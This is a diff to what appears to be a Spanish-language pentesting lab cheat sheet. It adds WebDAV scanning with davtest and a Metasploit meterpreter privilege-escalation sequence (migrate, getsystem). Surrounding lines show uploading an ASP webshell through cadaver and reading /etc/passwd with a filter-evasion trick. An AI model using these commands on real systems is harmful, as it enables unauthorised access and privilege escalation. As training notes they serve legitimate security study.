@@ -126,7 +126,8 @@ Si para acceder al sitio web salta un cuadro emergente pidiendo credenciales y l
 WEBDAV
 .......
 
-davtest -auth bob:password_123321 -url http://[URL]/webdav --> escanear vulns/subida archivos a una web con plugin webdav 
+davtest -url http://demo.ine.local/webdav --> escanear
+davtest -auth bob:password_123321 -url http://[URL]/webdav --> escanear vulns/subida archivos a una web con plugin webdav y sabiendo creds
 cadaver http://[URL]/webdav --> entrar en el webdav
       put /usr/share/webshells/asp/webshell.asp --> subir una webshell en el webdav una vez entrado con cadaver
 
@@ -519,13 +520,21 @@ cat
     extendido normal=c${HOA}at /etc/passwd
 
 
-METASPLOIT INIT
-................
+METASPLOIT
+...........
 
-sudo msfdb init
-sudo service postgresql start
 sudo msfconsole
+search
+use
+info
+options
+set
 
+  meterpreter to privesc:
+      ps -S explorer.exe --> obtener PID del proceso explorer.exe
+      migrate PID
+      getsystem
+      
 
 FIND FLAGS 
 ...........
